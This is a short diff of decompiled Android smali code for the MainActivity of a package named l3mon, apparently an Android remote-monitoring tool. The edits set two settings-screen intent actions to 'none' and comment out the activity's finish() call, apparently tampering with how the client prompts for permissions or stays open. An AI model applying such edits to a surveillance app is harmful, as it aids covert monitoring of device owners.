@@ -146,7 +146,7 @@
     .line 41
     new-instance v6, Landroid/content/Intent;
 
-    const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
+    const-string v7, "none"
 
     invoke-direct {v6, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
 
@@ -161,13 +161,14 @@
 
     move-result-object v7
 
-    const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"
+    const-string v8, "none"
 
     invoke-direct {v6, v8, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V
 
     .line 45
     .local v6, "i":Landroid/content/Intent;
     invoke-virtual {p0, v6}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V
+
 
     .line 48
     .end local v1    # "context":Landroid/content/Context;
@@ -177,7 +178,7 @@
     .end local v5    # "v":Landroid/widget/TextView;
     .end local v6    # "i":Landroid/content/Intent;
     :cond_0
-    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V
+    # invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V
 
     .line 49
     return-void
